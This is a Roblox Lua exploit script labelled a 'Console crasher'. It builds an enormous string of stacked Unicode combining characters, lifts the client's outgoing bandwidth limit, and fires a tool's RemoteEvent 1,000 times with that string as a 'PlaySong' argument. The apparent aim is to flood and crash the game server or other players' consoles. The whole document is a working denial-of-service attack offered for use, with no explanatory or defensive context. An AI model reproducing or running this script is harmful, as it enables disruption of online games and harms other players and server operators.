local str = "̴̡̢̧̢̧̧̡̧̧̧̡̧̨̢̢̢̧̢̡̡̧̡̨̡̧̨̨̢̢̨̢̢̧̨̡̡̢̢̨̨̧̢̡̡̧̢̨̢̨̧̡̡̧̨̢̡̢̡̨̨̧̢̢̡̡̨̧̧̢̢̡̨̡̧̨̢̡̢̡̢̢̧̢̨̡̢̧̨̨̨̡̢̢̡̢̢̧̨̡̢̨̨̧̢̨̢̧̢̢̢̧̡̡̨̢̨̨̨̢̨̨̧̨̢̢̧̡̢̨̨̧̢̨̢̡̡̡̧̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̛̭̭̱͓͖̬̹᷿͚̮̞̪᷂̹̼͔̬̭͈͓͕͚᷂᷂̬̜᷂͈̣̖̻̤͔̤̻̖̙̜̭̣̪͕̪͎᷂̦̪̝͔̼̹͈̮̻͎̼͇̯̠̣̞͔̤̙͚̙͔̰͇̮̭̪̣᷊̪͉̭̱͈̮͉̜̲͓̙̗̩͖̱͓᷂̙̗͉̱̦͚᷿̙͇̯̙̳͇͕̺̘̪̠̪͎̫͇̮̭̠̲̻̟̘̹̙̣̱̖̰͔̠̰̬̘̪̜̲̻̫̜͕᷊̻͓̪̦̖͓͎̠᷊͚̱᷂̭͖̮̪᷿̪̲̣̘͉̝̠͔͖̼̖͔᷂͕̻̬̖᷊̪̼̺̯̦̯᷿͎̱̦̳̪̗̯̙͔̮̦̺̲͓̣̘᷊͎̠̙̤̼̮̱̘͕̩̻͈̬̣̣̮̖̟̠̰̩̮͎͇̠͈̫̻̮͇̰̣͖̪͕̟̫͓̠̫̳̞͔̪̤̻̰̪᷿̙̱̲̞̱̞᷿̮̘̟̱᷊̦̼᷊͇̭͇᷊̣͖̻̞̻͉̰᷿͇͈̠͈̩̦̫̠̫̙̤̦̺̖̝̦̤͔̟͇̬̟̺̰̠̫̮̺̰̼̞̲͖̭᷊͎̞̼̞̭̱͓̫͕̳᷂̖͓͖᷊͇᷂̭̮̝͚͇̬᷿̪̺̪̪᷿̠̳̗͖᷂̻̜͉͓̹͇̗̯͚̫᷂̖̫̮͇͎̘͇̳͕͔̗̤̝͚̺̹͉͚̬᷊̝̪̖̘̗̙̱̝̼͕̬̭̼̙̟͔̻̩᷂͈͔̘͚̹̺͉̣̮᷂̟̱̙᷂̞̱̯͈͖̜͚͓̠̻̼̝̗͉̺̯̰̮͓̯̯̮̠͎͓̯͚͉͈̘͎͎̩᷂̫͔̩̯̟͓̖̣͎̦̣͉̠̳̠̳̦̟̜̼̰̺̯̫̫᷊̜̭̪͎̩̞̩̙͇̣̬͇͓̠̘̭̞̖̲͇͈̜̖̫̖̰̠᷂̩᷿̭᷊͎̺̲̜̻̰͇̟᷿̗̬͎̺̘̦̠̞̜̬͈̼͇̣͈͈̖̲̝͇̮̮̘̯̞͉͖͚̻̫̖̪̻͚͎̣᷿̼͓̜̟̜̦̩͎̳̘̙͚̪̩̪͈͉̙̳̗̘̘̰͉̻̯̠̖᷊̲̖͈̹̲̳̺̞̫̭͓͇̻͕͔̱͉̯̤͈̣̫͈͓͈̼᷊̹̼̮̝͔̤̮͎̪̲̘͖̜̳̬̜̠᷿᷊͈̫̻͚̙̝̗̗̱̙̲᷿̫̭͎̮̹̙̱̘̜̠͎̹̜̳̩̗͎̹̺̯̮͉᷂̭̝͉̣᷊̪̗̻̟̺̣͇̱̗̬͚̳᷂̜̯̝᷊̼̱᷿̙̤᷂̤̜̜̟̫̟̠̝͚̝̞͉͈᷂͔͔͎͎͈᷂̰̪̦̪̳̹̟̝᷿͖̫̲͉᷊̠̩̼̯̙̹̳᷊̹̞̟̜̮̫͚̖̻̳̹̼᷿͓̻᷊͔᷂̮̘̰̖̝̹͖̪̜͇᷊̳̲̦͇͎̬᷿̞̜̠͈̲̳̟͎͕̩̦͖̹̭͖̮͉̣̬᷿͓͚̻̯̪᷿̱̜̩̤᷊̠̩̟͚̻̹̮̹̰̲͖̠̟᷊̙̼̳̜̩͈̻̣̺̝͇͚̱᷂̲᷊͎̪᷂̠̙̯̫̩̠͓̖͈̠̩̣͈᷂̲̰̝̲̬̟̞̣͇͓͇̦̯͖͓᷂͇̘̺͖̘͚̳̰͓᷊̤͖̜̼̦᷿̪̖͈᷿͉̼̯̤͉̝͇͚̠͕͕̦̣͈̯̳̮᷂᷊̼͚᷊̱̗̣̻̰̰̬̟͇͇̤̫̜͖̬̫̪̫̺̻̯̭͕̳͔̮̭̫͉᷿͇͚̳̠̱͖̬̞̰̖̻̫͚͖͈̲̼̳͎̖͇̝̟᷂᷂̹͈̠̖̞̲̼̱͖̳͈͔̪͚̼͕͔͇͔̙͕̘̯͓̝̮᷂̙̭̹̻̖᷿͈̻᷿̰̪̩̤̙̼̤̟̼͖̹̪̹̮̙̝͓͇̭̦̘͇̣͈̙᷊̬̗̰̫̩͚̹᷿̰̲͓̖᷿͎͕̠͎̯͚̳̻᷂̪͖͖̗᷂̟̝̗͉̖̤͓̞̞̲᷊͇̱͎̞̞̭̪͈̩̺̤̬̹̲̣̝᷂̲̱͎̫͉̪̟̖͔᷊̭̮̠̘̺͔̱̖̰̞̰᷊͎̗̜̤̫̮̦̫̩͎̫̟̼᷿̙̭̺͇͎᷂̖̤̖̠̯̞᷿͖̳̝̘᷊̰̲͔͇̤̣̪̝᷂̘͚̹᷊̜͉̠̜̦̤̻̦̯᷊̤̝͖̞̣̘͉᷊̰̤͔̳̱̜̘̞̫̝᷿̘̪̲᷊̮͎̣̣͖̤̯̺̘̼̩᷊͉͚̗̦̼͓̝̖̲̫̟̬̦̖͕̹̖̺̺̘̳̮̭̦͓̖̜̠̰̰̝͚̻̘̻᷊͈̹͖͚͎͉͓̱͚̺̰͈̬̬̠̘̺̮̦̖̮͇͔̬̝͖̮̹̪͖̮̘̙̯̬̲͖͉̙̝̺̯̤̬̜̙̣̝̭͖̖̤̠︡ͧ̾᷉̓᷄ͮ̎ͧ͑͗͂́ͩ͌︠᷉ͪͧ̇̉̓᷁︡᷁ͨ︣̎͑︢̋̈́̓̈́̾︢︣̌᷾᷉̔̈́́ͭ᷇̔̿̄᷆ͣ̋̎᷈ͯͧ͆᷄̐̅̀ͯ̆͊̄͆̂̎ͬ͌̄͂᷾᷇̅︣̆ͬ͂ͮ͂᷀̍᷅̓͛᷆͆ͧ︣ͯ᷅͒͒ͩ᷇́̅͐ͮ︠̿͂ͤͥ᷇᷾̍̅᷃̀́̾͑̾̈͒̀ͨ͒̿̽ͩͥ͒᷈ͮ͒̉ͦͤ̏̇᷀̓ͪ̄ͬͥͤͮ̋᷆͆ͫ᷾͗̾̓͑͛̓ͮͫ̐͌̐︣᷇ͨ̀̈̾ͨͧ͗᷉ͫ̔͗͌̇̈᷾ͦ᷃̿ͤͯ͐ͦ͆̈́̅͆͂̎͗͑̅̌̉̋͐ͨ᷉͌̔̈̄̉̄᷉͐̾̀̓ͦ̀͋͗̆︢̾͊᷆ͩͫ︡︢̿ͭ͒ͫ̈́᷀︠̋̂ͬ͑ͯ᷇͑︣᷃͗̐︢͆̓᷁̀ͤ͂︠̋᷾᷀̄︢ͭ᷆ͬ᷉ͯ̄ͭͪͮ︡︠ͮ͂̇̈ͩͥ̐͋ͫ︣̓͂̇̽᷈͂̋͆͛᷾̈︡̐̿︢̍ͮͪͭ́̍͋̄᷆̿᷀᷀̅̾͛͆ͫ͊͑͂ͥ̎ͧ̌͆ͪͪ̋̾ͦ̎᷅̆̔᷇ͧ̈́᷇̌︣᷁̽̉ͩ͊ͮ́̋̎͋︠̅̓͋ͭ́ͮ̆̔ͭ᷁ͥ̄̈᷇̀̉̽ͬͯͧ̽͌̑ͪͪ̀ͥ̈́̅́̔︠͊̓̋᷃̇᷀̽̅ͨͧ͋︢͆᷾᷇͋͑́︠︢̓᷄̉͂̐͗̄ͣ͊̈́᷾ͥͦͨ͗᷾᷀ͯͬͨͣ̈́᷉̃͛͒︠̇͊́̓͑̑́᷅᷉̀ͬ᷈͛᷾ͮ̀̐́̓̔͐ͬ̔᷉᷆̽̍︣ͣ̐̓̈ͣ̍̓̑̋᷄ͨ̇̈ͥͯ̀͛᷃ͯͪ᷉ͦ̋ͩͦͪͫͬ̃͌̏ͥͣ͗ͯ́ͦͣ᷉̌ͧͭ̽̉͛̂̄͗̈́̿̈͊ͣ᷃᷅ͧ᷁ͮ᷆̀ͩ̓︣︡̂̈ͣ́̓ͦ̈́᷃᷈᷈̈᷀͌᷉᷄︢︣ͪͫ̀́͂᷇ͮ᷅̏͛᷾᷃᷁᷉᷅ͨ́᷉̀͂︠ͮͤ̑᷉̐ͭ̂ͨͣ̂̆ͣ͛ͭ̈̌︡ͬ̈́̃́ͪ̾᷀̆ͭ͊̐︢̑᷈̑̈́̾᷄᷉ͧ͋᷈̍́̂̾͊ͥ̉᷁͗͑̌ͯ᷇̑͊ͯͭ͛̅̐̀︣͆̄᷁͋᷆́̎ͭ͌͒ͨ︢̀᷾ͮ᷇̈᷅̉᷆̍͋͂̐̀᷇̌̿᷾᷇͛ͭ᷅ͤͤͩͪ᷃ͨ̿̀᷈͗̈́͐͋̽᷾͑ͣ︢̄̾ͩ᷁̂͛̾̍̋̾ͤ᷅ͣ̀᷆ͥ͛ͧͩ̉᷈̿̄ͤ͑᷄̈᷀ͬͫͩ̀ͬ᷃͂᷆ͤ̓̾̽̋ͩ̋͑͑͑̓̀̀͐͐́̈̈͐ͬ̃᷆̓͋͛̍᷃̇̽͐ͬ͒᷀̑̐᷃͐᷁᷅̃̀̾̇ͥͧͨ᷃ͯ̇᷅͊͌̂︠᷀ͪ᷄̓ͧͤ̐͐͑ͬ᷄᷾᷅̔ͪ᷀͂͌̓̾̄ͪ̀̈́᷄̂̂̑︢̆̓̔ͤ︢̌᷄̃̉᷆̍̈͒̀︢͊︣̓ͧ̄ͦ̈́̾ͪ᷆̄̈́︢ͦͭ̈︠̃᷉᷁ͤ᷉̅︠ͮ͛̈̔̾᷉᷃́͑᷉͒̿̂̾͑̓̈́͋᷁̄͐᷀̈̈́᷁̍ͬ̎́ͨ̔̄̏̐́ͣ᷉᷀᷁ͨͤ͛͋̀̈́̀ͣͥ̾ͨͩ̎̐̄̈︡̈́̈́̄̐̍͊̈́᷉︡ͬ᷈᷉᷆ͤ̐᷾͊́ͪ͐ͫ̄ͧͣ︡́ͫ͐̇︡̑̎ͮ᷆᷆̏͋̈ͨ͊͊ͯͯ̋̑᷈᷇̈᷇͌̍ͭ̅︢᷉̌̓͐ͥ̇ͭͨ͒̍̓̀᷆ͥ᷄᷃ͣ᷈́͐ͩͧ́̓͌̆ͧ̄̌ͣͧͤ︠͊ͮ͆͌͛̈ͥ͛᷃́᷈̏̃̾́︢̈́︢̃ͥͦ͂̑᷾̋᷅̓︠︠̐͊︠͌ͤ̿́ͤ̓᷆᷅̅͗ͤ̍᷁᷁̏ͭͧͧ̀̽͂̇᷄᷄ͪ̈̋̽̐ͨ᷇᷉͒᷃̋ͮ̅̆᷾᷆͛̓͋ͥ̌̀᷾̿᷅̑̔̑᷅̋̆̋ͬ͒᷁̅᷈̓̎ͧ᷇͌᷃͗́ͬͤͪ͆͊᷈̃̋̿͋ͩ̀ͪ᷃͌́̑̀̍͒᷄ͯ︣ͪ̽︣ͣ̑ͦ᷅̑͗͊᷈︡᷁᷆͌ͮ̐͋᷃ͮ̇͗̆̌̾̋᷁᷃̀ͧͬ͂̃᷈̽̍͛̈́̔̄ͫ︠͋᷆᷈̎̂̀̓̋̽̇͛́︠᷾͌̀ͦ͂͆̐︢̋᷀᷆͗̋ͩͦ̔︡᷆᷈̓᷄́︣̌͌͛᷁̏᷈̄͆́͆̏͂︣͒̉̐̐̋ͩ̈̉͒̇̃̇̿̃̋͐̿͛ͭͭͭ̃̈́ͧ̉̀᷆̏᷄̓᷈︡̎ͥ̆͊͆̃︡ͥ̓́᷄᷈ͮ̀͐̄︠ͤ᷀͋᷈́̄̈᷉᷇᷄̈᷾︣̏̌︢ͥͣ͂︢̀︢̆͌̀︠ͣ︣́᷾᷅︠᷇̍̐̎ͭ͌᷾̄ͪ᷅͐᷈̑̓͒̏̓̋͗̎͛︣᷆ͭͦ᷃́̓᷉̅͆ͫ︣᷄ͬͭ͒ͥ͆̎́͊͑̎̅᷀᷀͊̌︠᷈ͩ͑︢ͤ̓᷃̑ͣ᷉̇̀̄͑́́̐͒̈́︡́᷄͑̅᷉̂̓᷁᷉︣͐ͦͭ̈́ͮ̎︢͘̕̕͘͘͘̚͘̚͘̚̚̕͘̚͘̚̚̚̕̚͘̕̕̚̕̚̕̕̚̚͘̚͘̕̕͘̕̕̚̕͘͘̚͘̕̚̚̕̕̚͘̕̚͘͘͘̕͜͜͟͜͟͢͜͢͜͢͢͟͢͟͜͟͜͢͢͟͢͜͢͜͟͜͜͜͟͜͢͟͜͜͢͜͜͜͟͢͟͢͟͢͢͜͢͟͟͟͜͟͜͜͢͟͟͢͢͢͜͜͢͟͟͜͟͟͟͟͟͜͟͢͟͜͟͜͜͟͜͜͢͟͟͢͟͟͜͜͜͜͞͡͡͝͝͞͞͡͡͠͡͡͞͝͝͠͡͞͠͞͝͡͞͝͠͝͠͠͡͠͡͝͝͝͠͡͡͞͞͝͞͠͝͡͞͞͝͝͡͡͝͞͠͡͠͡͞͡͞͠͝͝͝͠͝͡͡͠͝͠͠͠͡͡͠͠͝͞͡͝"







str = str:rep(2)
local bb = game.Players.LocalPlayer.Character:FindFirstChildOfClass("Tool") or game.Players.LocalPlayer.Backpack:FindFirstChildOfClass("Tool") 
bb.Parent = game.Players.LocalPlayer.Character
local rem = bb:FindFirstChildOfClass("RemoteEvent")
game:GetService("NetworkClient"):SetOutgoingKBPSLimit(math.huge)
wait()
for _ = 1,100 do
    for i = 1,10 do
        rem:FireServer("PlaySong",tostring(i) .. str)
        task.wait()
    end
end
messagebox("Console crasher finished loading","Success",0)
